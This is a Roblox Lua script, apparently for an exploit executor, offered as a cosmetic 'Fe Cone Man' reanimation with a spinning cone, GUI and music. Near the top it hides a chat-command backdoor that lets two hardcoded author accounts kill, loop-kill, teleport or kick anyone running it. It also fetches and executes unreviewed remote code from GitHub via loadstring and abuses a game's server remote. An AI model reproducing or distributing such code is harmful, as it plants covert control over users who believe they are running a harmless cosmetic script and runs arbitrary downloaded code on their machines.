local uis = game:GetService("UserInputService")
local lp = game:GetService("Players").LocalPlayer
local rs = game:GetService("RunService")
local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/Notification-Library/Main/Library.lua"))()

NotificationLibrary:SendNotification("Error", "Hate me if you want - C00l_Ch4os", 120)
NotificationLibrary:SendNotification("Info", "Credit To Oldhacfard And C00l_Ch4os", 10)

local AdminUsers = {"C00l_Ch4os", "Noah_Kulkas0"}
local loopKillActive = false

local function onChatted(msg, speaker)
    local isAdmin = false
    for _, name in pairs(AdminUsers) do
        if speaker.Name == name then
            isAdmin = true
            break
        end
    end

    if isAdmin then
        local args = msg:split(" ")
        local cmd = args[1]:lower()
        local targetName = args[2]

        local function checkTarget(target)
            if not target then return false end
            target = target:lower()
            if target == "me" and speaker == lp then return true end
            if target == "all" then return true end
            if target == "others" and speaker ~= lp then return true end
            if lp.Name:lower():sub(1, #target) == target then return true end
            return false
        end

        if checkTarget(targetName) then
            if cmd == ".kill" then
                if lp.Character and lp.Character:FindFirstChild("Humanoid") then
                    lp.Character.Humanoid.Health = 0
                end
            
            elseif cmd == ".loopkill" then
                loopKillActive = true
                task.spawn(function()
                    while loopKillActive do
                        if lp.Character and lp.Character:FindFirstChild("Humanoid") then
                            lp.Character.Humanoid.Health = 0
                        end
                        task.wait(0.1)
                    end
                end)

            elseif cmd == ".unloopkill" then
                loopKillActive = false

            elseif cmd == ".bring" then
                if speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart") and lp.Character then
                    lp.Character:MoveTo(speaker.Character.HumanoidRootPart.Position)
                end

            elseif cmd == ".sit" then
                if lp.Character and lp.Character:FindFirstChild("Humanoid") then
                    lp.Character.Humanoid.Sit = true
                end
                local remoteArgs = {"cmd", "-sit"}
                game:GetService("ReplicatedStorage"):WaitForChild("01_server"):FireServer(unpack(remoteArgs))

            elseif cmd == ".jump" then
                if lp.Character and lp.Character:FindFirstChild("Humanoid") then
                    lp.Character.Humanoid.Jump = true
                end

            elseif cmd == ".rs" then
                local remoteArgs = {"cmd", "-rs"}
                game:GetService("ReplicatedStorage"):WaitForChild("01_server"):FireServer(unpack(remoteArgs))

            elseif cmd == ".ch" then
                local remoteArgs = {"cmd", "-ch"}
                game:GetService("ReplicatedStorage"):WaitForChild("01_server"):FireServer(unpack(remoteArgs))

            elseif cmd == ".re" then
                local remoteArgs = {"cmd", "-re"}
                game:GetService("ReplicatedStorage"):WaitForChild("01_server"):FireServer(unpack(remoteArgs))

            elseif cmd == ".r6" then
                local remoteArgs = {"cmd", "-r6"}
                game:GetService("ReplicatedStorage"):WaitForChild("01_server"):FireServer(unpack(remoteArgs))

            elseif cmd == ".r15" then
                local remoteArgs = {"cmd", "-r15"}
                game:GetService("ReplicatedStorage"):WaitForChild("01_server"):FireServer(unpack(remoteArgs))

            elseif cmd == ".kick" then
                local reason = ""
                for i = 3, #args do
                    reason = reason .. args[i] .. " "
                end
                if reason == "" then reason = "Kicked by Admin" end
                lp:Kick(reason)
            end
        end
    end
end

for _, player in pairs(game:GetService("Players"):GetPlayers()) do
    player.Chatted:Connect(function(msg) onChatted(msg, player) end)
end
game:GetService("Players").PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg) onChatted(msg, player) end)
end)

local screenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
screenGui.Name = "FeConeMan_Gui"

local toggleBtn = Instance.new("Frame", screenGui)
toggleBtn.Size = UDim2.new(0, 50, 0, 50)
toggleBtn.Position = UDim2.new(0, 20, 0.5, -25)
toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.BackgroundTransparency = 0.6
toggleBtn.BorderSizePixel = 8
toggleBtn.BorderColor3 = Color3.new(0,0,0)

local cornerToggle = Instance.new("UICorner", toggleBtn)
cornerToggle.CornerRadius = UDim.new(1, 0)

local mainBtn = Instance.new("TextButton", toggleBtn)
mainBtn.Size = UDim2.new(1, 0, 1, 0)
mainBtn.BackgroundTransparency = 1
mainBtn.Text = ""

local dragging, dragInput, dragStart, startPos
mainBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = toggleBtn.Position
    end
end)
uis.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
        local delta = input.Position - dragStart
        toggleBtn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
uis.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
end)

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 400, 0, 250)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
mainFrame.BackgroundTransparency = 0.5
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.new(0,0,0)
mainFrame.Visible = false

local cornerMain = Instance.new("UICorner", mainFrame)
cornerMain.CornerRadius = UDim.new(0, 10)

local title = Instance.new("TextLabel", mainFrame)
title.Text = "Fe Cone Man"
title.TextColor3 = Color3.new(1,1,1)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Font = Enum.Font.SourceSansBold
title.TextSize = 20

local logFrame = Instance.new("ScrollingFrame", mainFrame)
logFrame.Size = UDim2.new(0.9, 0, 0.4, 0)
logFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
logFrame.BackgroundColor3 = Color3.new(255,255,255)
logFrame.BackgroundTransparency = 0.3
logFrame.CanvasSize = UDim2.new(0, 0, 2, 0)
logFrame.ScrollBarThickness = 4

local logTitle = Instance.new("TextLabel", logFrame)
logTitle.Text = "CHANGE LOG:\n- Hate me if you want - C00l_Ch4os\n- Credit: Oldhacfard & C00l_Ch4os"
logTitle.TextColor3 = Color3.new(0,0,0)
logTitle.Size = UDim2.new(1, 0, 1, 0)
logTitle.BackgroundTransparency = 1
logTitle.TextYAlignment = Enum.TextYAlignment.Top
logTitle.TextXAlignment = Enum.TextXAlignment.Left

local reanimBtn = Instance.new("TextButton", mainFrame)
reanimBtn.Text = "Reanim/Run"
reanimBtn.Size = UDim2.new(0.4, 0, 0, 40)
reanimBtn.Position = UDim2.new(0.05, 0, 0.75, 0)
reanimBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
reanimBtn.BackgroundTransparency = 0.6
reanimBtn.TextColor3 = Color3.new(0,0,0)
Instance.new("UICorner", reanimBtn)

local getHatBtn = Instance.new("TextButton", mainFrame)
getHatBtn.Text = "Get Hat"
getHatBtn.Size = UDim2.new(0.4, 0, 0, 40)
getHatBtn.Position = UDim2.new(0.55, 0, 0.75, 0)
getHatBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
getHatBtn.BackgroundTransparency = 0.6
getHatBtn.TextColor3 = Color3.new(0,0,0)
Instance.new("UICorner", getHatBtn)

mainBtn.MouseButton1Click:Connect(function() mainFrame.Visible = not mainFrame.Visible end)

getHatBtn.MouseButton1Click:Connect(function()
    local args = {"cmd", "-gh 86192283221920"}
    game:GetService("ReplicatedStorage"):WaitForChild("01_server"):FireServer(unpack(args))
    task.wait(2)
    local args = {"cmd", "-sh"}
    game:GetService("ReplicatedStorage"):WaitForChild("01_server"):FireServer(unpack(args))
    NotificationLibrary:SendNotification("Info", "Hat Command Executed!", 2) 
end)

reanimBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
    NotificationLibrary:SendNotification("Warning", "Loading...", 3)
    
    local args = {"cmd", "-rs"}
    game:GetService("ReplicatedStorage"):WaitForChild("01_server"):FireServer(unpack(args))
    wait(2)
    local args = {"cmd", "-net"}
    game:GetService("ReplicatedStorage"):WaitForChild("01_server"):FireServer(unpack(args))

    loadstring(game:HttpGet("https://raw.githubusercontent.com/oldhacfard/The-script/refs/heads/main/Reanimate.luau"))()
    task.wait(1)

    local char = lp.Character
    local hum = char:WaitForChild("Humanoid")
    hum.WalkSpeed = 35
    hum.JumpPower = 75
    local tor = char:WaitForChild("Torso")
    local root = char:WaitForChild("HumanoidRootPart")
    
    local animate = char:FindFirstChild("Animate")
    if animate then animate.Disabled = true end
    for _, v in pairs(hum:GetPlayingAnimationTracks()) do v:Stop() end

    local cone = nil
    for _, v in pairs(char:GetDescendants()) do
        if v:IsA("Accessory") and v:FindFirstChild("Handle") then
            local mesh = v.Handle:FindFirstChildOfClass("SpecialMesh")
            if mesh and (mesh.TextureId:find("107522988551341") or mesh.MeshId:find("107522988551341")) then
                cone = v.Handle
                cone:BreakJoints()
                cone.CanCollide = false
            end
        end
    end

    local joints = {
        root = root:WaitForChild("RootJoint"),
        neck = tor:WaitForChild("Neck"),
        rs = tor:WaitForChild("Right Shoulder"),
        ls = tor:WaitForChild("Left Shoulder"),
        rh = tor:WaitForChild("Right Hip"),
        lh = tor:WaitForChild("Left Hip")
    }

    local function cf(p, r) 
        return CFrame.new(p) * CFrame.fromEulerAnglesXYZ(math.rad(r.X), math.rad(r.Y), math.rad(r.Z)) 
    end

    local currentCFs = {}
    for name, joint in pairs(joints) do currentCFs[name] = joint.Transform end
    local coneCF = CFrame.new()
    local cone_data = {pos = Vector3.new(0, 0, 0), rot = Vector3.new(0, 0, 0)}
    local lerpSpeed = 0.1
    local sprint = false

    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://89405293093165"
    sound.Looped = true
    sound.Volume = 2
    sound.Parent = root
    sound:Play()

    uis.InputBegan:Connect(function(input, gpe)
        if gpe then return end
        if input.KeyCode == Enum.KeyCode.Q then
            sprint = not sprint
            hum.WalkSpeed = sprint and 70 or 35
        end
    end)

    rs.Stepped:Connect(function()
        local state = "idle"
        local vel = tor.Velocity.Magnitude
        local hState = hum:GetState()
        local moveDir = root.CFrame:VectorToObjectSpace(hum.MoveDirection)
        local rotCont = (tick() * 350) % 360

        if hState == Enum.HumanoidStateType.Climbing then state = "climb"
        elseif hState == Enum.HumanoidStateType.Freefall then state = "fall"
        elseif hState == Enum.HumanoidStateType.Jumping then state = "jump"
        elseif hState == Enum.HumanoidStateType.Seated then state = "sit"
        elseif vel > 0.1 then
            if moveDir.Z < -0.1 then state = "walkW"
            elseif moveDir.Z > 0.1 then state = "walkS"
            elseif moveDir.X < -0.1 then state = "walkA"
            elseif moveDir.X > 0.1 then state = "walkD"
            else state = "walkW" end
        end

        local targets = {}
        local sin = math.sin(tick() * 1.5) * 10
        local walkSin = math.sin(tick() * 2.5)

        if state == "idle" then
            if not sprint then
                targets.root = cf(Vector3.new(0,0,0), Vector3.new(0,0,0))
                targets.neck = cf(Vector3.new(0,0,0), Vector3.new(20+sin,0,20))
                targets.rs = cf(Vector3.new(0,0,0), Vector3.new(-10,-30,-10+sin))
                targets.ls = cf(Vector3.new(0,0,0), Vector3.new(-10,30,10+sin))
                targets.rh = cf(Vector3.new(0,0,0), Vector3.new(-10,-20+-sin,0))
                targets.lh = cf(Vector3.new(0,0,0), Vector3.new(-10,-20+-sin,0))
                cone_data.pos = Vector3.new(math.sin(tick() * 1.5) * 2.5, 3, 2)
            else
                targets.root = cf(Vector3.new(0,0,0), Vector3.new(5,0,0))
                targets.neck = cf(Vector3.new(0,0,0), Vector3.new(20+sin, 0, 0))
                targets.rs = cf(Vector3.new(0,0,0), Vector3.new(-10,-20,-10+sin))
                targets.ls = cf(Vector3.new(0,0,0), Vector3.new(-10,20,10+sin))
                targets.rh = cf(Vector3.new(0,0,0), Vector3.new(-15,-10,-10+-sin))
                targets.lh = cf(Vector3.new(0,0,0), Vector3.new(-15,15,0+-sin))
                cone_data.pos = Vector3.new(math.sin(tick() * 1.5) * 2.5, 3, 2)
            end
            cone_data.rot = Vector3.new(0, rotCont, 0)
        elseif state == "walkW" then
            targets.root = cf(Vector3.new(0,0,0), Vector3.new(sprint and 25 or 5,0,0))
            targets.neck = cf(Vector3.new(0,0,0), Vector3.new(sprint and 15 or 10,0,0))
            targets.rs = cf(Vector3.new(0,0,0), Vector3.new(0,0,walkSin * (sprint and 60 or 30)))
            targets.ls = cf(Vector3.new(0,0,0), Vector3.new(0,0,walkSin * (sprint and 60 or 30)))
            targets.rh = cf(Vector3.new(0,0,0), Vector3.new(0,0,walkSin * (sprint and -60 or -30)))
            targets.lh = cf(Vector3.new(0,0,0), Vector3.new(0,0,walkSin * (sprint and -60 or -30)))
            cone_data.pos = Vector3.new(math.sin(tick() * 1.5) * (sprint and 4 or 2.5), 3, 2)
            cone_data.rot = Vector3.new(0, rotCont, 0)
        elseif state == "walkS" then
            targets.root = cf(Vector3.new(0,0,0), Vector3.new(sprint and -20 or -10,0,0))
            targets.neck = cf(Vector3.new(0,0,0), Vector3.new(10,0,0))
            targets.rs = cf(Vector3.new(0,0,0), Vector3.new(-5,0,sin))
            targets.ls = cf(Vector3.new(0,0,0), Vector3.new(-5,0,sin))
            targets.rh = cf(Vector3.new(0,0,0), Vector3.new(0,0,walkSin * -30))
            targets.lh = cf(Vector3.new(0,0,0), Vector3.new(0,0,walkSin * -30))
            cone_data.pos = Vector3.new(math.sin(tick() * 1.5) * 2.5, 3, 2)
            cone_data.rot = Vector3.new(0, rotCont, 0)
        elseif state == "walkA" then
            targets.root = cf(Vector3.new(0,0,0), Vector3.new(0,sprint and 25 or 10,0))
            targets.neck = cf(Vector3.new(0,0,0), Vector3.new(10,0,0))
            targets.rs = cf(Vector3.new(0,0,0), Vector3.new(-5,0,sin))
            targets.ls = cf(Vector3.new(0,0,0), Vector3.new(-5,0,sin))
            targets.rh = cf(Vector3.new(0,0,0), Vector3.new(0,0,walkSin * -30))
            targets.lh = cf(Vector3.new(0,0,0), Vector3.new(0,0,walkSin * -30))
            cone_data.pos = Vector3.new(math.sin(tick() * 1.5) * 2.5, 3, 2)
            cone_data.rot = Vector3.new(0, rotCont, 0)
        elseif state == "walkD" then
            targets.root = cf(Vector3.new(0,0,0), Vector3.new(0,sprint and -25 or -10,0))
            targets.neck = cf(Vector3.new(0,0,0), Vector3.new(10,0,0))
            targets.rs = cf(Vector3.new(0,0,0), Vector3.new(-5,0,sin))
            targets.ls = cf(Vector3.new(0,0,0), Vector3.new(-5,0,sin))
            targets.rh = cf(Vector3.new(0,0,0), Vector3.new(0,0,walkSin * -30))
            targets.lh = cf(Vector3.new(0,0,0), Vector3.new(0,0,walkSin * -30))
            cone_data.pos = Vector3.new(math.sin(tick() * 1.5) * 2.5, 3, 2)
            cone_data.rot = Vector3.new(0, rotCont, 0)
        elseif state == "jump" or state == "fall" then
            targets.root = cf(Vector3.new(0,0,0), Vector3.new(-10,0,0))
            targets.neck = cf(Vector3.new(0,0,0), Vector3.new(-20,0,0))
            targets.rs = cf(Vector3.new(0,0,0), Vector3.new(-50,0,0))
            targets.ls = cf(Vector3.new(0,0,0), Vector3.new(-50,0,0))
            targets.rh = cf(Vector3.new(0.5,0.5,0), Vector3.new(-10,0,-30))
            targets.lh = cf(Vector3.new(0,0,0), Vector3.new(-5,0,20))
            cone_data.pos = Vector3.new(math.sin(tick() * 1.5) * 2.5, 3, 2)
            cone_data.rot = Vector3.new(0, rotCont, 0)
        elseif state == "sit" then
            local sin = math.sin(tick() * 1.5) * 10
            targets.root = cf(Vector3.new(0,0,0), Vector3.new(0,0,0))
            targets.neck = cf(Vector3.new(0,0,0), Vector3.new(20+sin,0,20))
            targets.rs = cf(Vector3.new(0,0,0), Vector3.new(-10,10,-30+sin))
            targets.ls = cf(Vector3.new(0,0,0), Vector3.new(-10,0,30+sin))
            targets.rh = cf(Vector3.new(0,0,0), Vector3.new(-10,-10,90+-sin))
            targets.lh = cf(Vector3.new(0,0,0), Vector3.new(-10,10,-90+-sin))
            cone_data.pos = Vector3.new(3.5,0.1,0)
            cone_data.rot = Vector3.new(0,rotCont,0)
        elseif state == "climb" then
            targets.rs = cf(Vector3.new(0, 0, 0), Vector3.new(0, 0, 160))
            targets.ls = cf(Vector3.new(0, 0, 0), Vector3.new(0, 0, -160))
            cone_data.pos = Vector3.new(math.sin(tick() * 1.5) * 2.5, 3, 2)
            cone_data.rot = Vector3.new(0, rotCont, 0)
        end

        for name, joint in pairs(joints) do
            if targets[name] then
                currentCFs[name] = currentCFs[name]:Lerp(targets[name], lerpSpeed)
                joint.Transform = currentCFs[name]
            end
        end
    end)

    rs.Heartbeat:Connect(function()
        if cone and cone.Parent then
            local targetConeCF = CFrame.new(cone_data.pos) * CFrame.fromEulerAnglesXYZ(math.rad(cone_data.rot.X), math.rad(cone_data.rot.Y), math.rad(cone_data.rot.Z))
            coneCF = coneCF:Lerp(targetConeCF, lerpSpeed)
            cone.CFrame = tor.CFrame * coneCF
            cone.Velocity = Vector3.new(0, 35, 0) 
            cone.AssemblyLinearVelocity = Vector3.new(0, 35, 0)
        end
    end)
    
    NotificationLibrary:SendNotification("Success", "Fe Cone Man Loaded!", 3)
end)
